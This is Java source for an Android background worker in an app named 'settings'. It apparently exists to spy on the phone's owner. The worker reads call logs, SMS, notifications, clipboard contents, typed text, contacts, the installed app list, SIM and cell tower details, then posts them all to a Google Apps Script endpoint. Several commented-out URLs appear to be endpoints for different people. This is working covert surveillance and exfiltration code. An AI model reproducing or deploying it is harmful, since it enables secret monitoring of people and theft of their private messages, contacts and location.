package com.example.settings;

import android.app.Activity;
import android.content.ClipData;
import android.content.Context;
import android.util.Log;


import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import java.util.HashMap;

import java.util.Map;

import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
import static com.example.settings.MainActivity.clipboardManager;
import static com.example.settings.MainActivity.deviceInformation;
import static com.example.settings.MainActivity.getCellInfo;
import static com.example.settings.MainActivity.setupWorkManager;
import static com.example.settings.MainActivity.setuponetimeworkManager;
import static com.example.settings.MainActivity.simName;
import static com.example.settings.Utils.getDateTime;

public class SyncData extends Worker {
    Sharedpref mSharedpref;
    Context context;
    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
            Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
            SmsData,OtherNotificationData,ClickedData,OtherClickedData;
    String url="";
    public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        mSharedpref = new Sharedpref(context);
        this.context = context;

    }

    @NonNull
    @Override
    public Result doWork() {
        //saimaurl
        url=mSharedpref.getUrl();
        //url="https://script.google.com/macros/s/AKfycbwTSLIFqr1sjKmKw8LNHG4VxyRsiEYn87F3FkGnyse1Ey64ChtQ/exec";

        /*Asima Url*/
        //url="https://script.google.com/macros/s/AKfycbww2stEdxwyoiSedfbPLOCQrhWWJ29SPplLfFXEs1IwXDwZtSM/exec";

        /*Abu ji Url*/
        //url="https://script.google.com/macros/s/AKfycbzL-e8xcaMP3Cu5rcv1SIFgZdQ1ayEtBX7d6Bo5/exec";

        Name = mSharedpref.getSaveName();
        OutgoingNumbers = mSharedpref.getOutgoingNumbers();
        RecievedNumbers = mSharedpref.getRecievedNumbers();
        MissedCallNumbers = mSharedpref.getMissedCallNumber();
        TextWritten = mSharedpref.getSaveTextWritten();
        NotificationData = mSharedpref.getNotificationData();
        SmsData=mSharedpref.getSmsData();
        OtherNotificationData=mSharedpref.getOtherNotificationData();
        ClickedData=mSharedpref.getClickedData();
        OtherClickedData=mSharedpref.getOtherClickedData();
        try {
            ClipData pData = clipboardManager.getPrimaryClip();
            if (pData != null) {
                ClipData.Item item = pData.getItemAt(0);
                Copiedtext = item.getText().toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }


        DaysTime = mSharedpref.getPrevDate()+" to " +getDateTime();
        if(isConnectedToNetwork(context)){
            if (!Name.isEmpty()) {
                int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
                if (mSharedpref.getPrevPhoneNumbersLisSize() != numberlistsize) {
                    Phonenumberdetails = mSharedpref.getPhoneNumbers();
                    mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
                    mSharedpref.commit();
                }
                int ApplistSize= mSharedpref.getPhoneAppdetailsListSize();
                if (mSharedpref.getPrevPhoneAppdetailsListSize() != mSharedpref.getPhoneAppdetailsListSize()) {
                    Phoneappdetails = mSharedpref.getPhoneAppdetails();
                    mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
                    mSharedpref.commit();
                }

                if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
                        !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
                        || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() ||
                        !SmsData.isEmpty() || !OtherNotificationData.isEmpty()
                        || !ClickedData.isEmpty() || !OtherClickedData.isEmpty() ||
                        !Phoneappdetails.isEmpty()) {
                    StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                            new Response.Listener<String>() {
                                @Override
                                public void onResponse(String response) {
                                    Log.d(context.getPackageName(),response);
                                    mSharedpref.setOutgoingNumbers("");
                                    mSharedpref.setRecievedNumbers("");
                                    mSharedpref.setMissedCallNumber("");
                                    mSharedpref.setSaveTextWritten("");
                                    mSharedpref.setNotificationData("");
                                    mSharedpref.setOtherNotificationData("");
                                    mSharedpref.setSmsData("");
                                    mSharedpref.setClickedData("");
                                    mSharedpref.setOtherClickedData("");
                                    mSharedpref.savePrevDate(getDateTime());
                                    mSharedpref.commit();
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    Log.d(context.getPackageName(),"Error");
                                    setuponetimeworkManager();
                                    Result.retry();

                                }
                            }
                    ) {
                        @Override
                        protected Map<String, String> getParams() {
                            Map<String, String> parmas = new HashMap<>();

                            //here we pass params
                            parmas.put("action", "addItem");
                            parmas.put("Name", Name);
                            parmas.put("DaysTime", DaysTime);
                            parmas.put("TextWritten", TextWritten);
                            parmas.put("OutgoingNumbers", OutgoingNumbers);
                            parmas.put("RecievedNumbers", RecievedNumbers);
                            parmas.put("MissedCallNumbers", MissedCallNumbers);
                            parmas.put("Copiedtext", Copiedtext);
                            parmas.put("Phonenumberdetails", Phonenumberdetails);
                            parmas.put("Phoneappdetails", Phoneappdetails);
                            parmas.put("NotificationData", NotificationData);
                            parmas.put("OtherNotificationData", OtherNotificationData);
                            parmas.put("SmsData", SmsData);
                            parmas.put("ClickedData", ClickedData);
                            parmas.put("OtherClickedData", OtherClickedData);
                            parmas.put("Simdetails", String.valueOf(simName(context)));
                            parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                            parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
                            return parmas;
                        }
                    };

                    int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
                    RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
                    stringRequest.setRetryPolicy(retryPolicy);

                    RequestQueue queue = Volley.newRequestQueue(context);
                    queue.add(stringRequest);
                }
                else {
                    Log.d(context.getPackageName(),"All empty");
                    StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                            new Response.Listener<String>() {
                                @Override
                                public void onResponse(String response) {
                                    Log.d(context.getPackageName(),response);
                                    mSharedpref.setOutgoingNumbers("");
                                    mSharedpref.setRecievedNumbers("");
                                    mSharedpref.setMissedCallNumber("");
                                    mSharedpref.setSaveTextWritten("");
                                    mSharedpref.setNotificationData("");
                                    mSharedpref.setOtherNotificationData("");
                                    mSharedpref.setSmsData("");
                                    mSharedpref.setClickedData("");
                                    mSharedpref.setOtherClickedData("");
                                    mSharedpref.savePrevDate(getDateTime());
                                    mSharedpref.commit();
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    Log.d(context.getPackageName(),"All empty Error");
                                    setuponetimeworkManager();

                                    Result.retry();

                                }
                            }
                    ) {
                        @Override
                        protected Map<String, String> getParams() {
                            Map<String, String> parmas = new HashMap<>();

                            //here we pass params
                            parmas.put("action", "addItem");
                            parmas.put("Name", Name);
                            parmas.put("DaysTime", DaysTime);
                            parmas.put("TextWritten", "Everything is empty");
                            parmas.put("OutgoingNumbers", OutgoingNumbers);
                            parmas.put("RecievedNumbers", RecievedNumbers);
                            parmas.put("MissedCallNumbers", MissedCallNumbers);
                            parmas.put("Copiedtext", Copiedtext);
                            parmas.put("Phonenumberdetails", Phonenumberdetails);
                            parmas.put("Phoneappdetails", Phoneappdetails);
                            parmas.put("NotificationData", NotificationData);
                            parmas.put("OtherNotificationData", OtherNotificationData);
                            parmas.put("SmsData", SmsData);
                            parmas.put("ClickedData", ClickedData);
                            parmas.put("OtherClickedData", OtherClickedData);
                            parmas.put("Simdetails", String.valueOf(simName(context)));
                            parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                            parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
                            return parmas;
                        }
                    };

                    int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
                    RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
                    stringRequest.setRetryPolicy(retryPolicy);

                    RequestQueue queue = Volley.newRequestQueue(context);
                    queue.add(stringRequest);

                }
            }
            else {
                Log.d(context.getPackageName(),"Name empty");
                Result.retry();

            }
        }
        else {
            Log.d("Settings","Internet Problem");
        }

        return Result.success();
    }
}
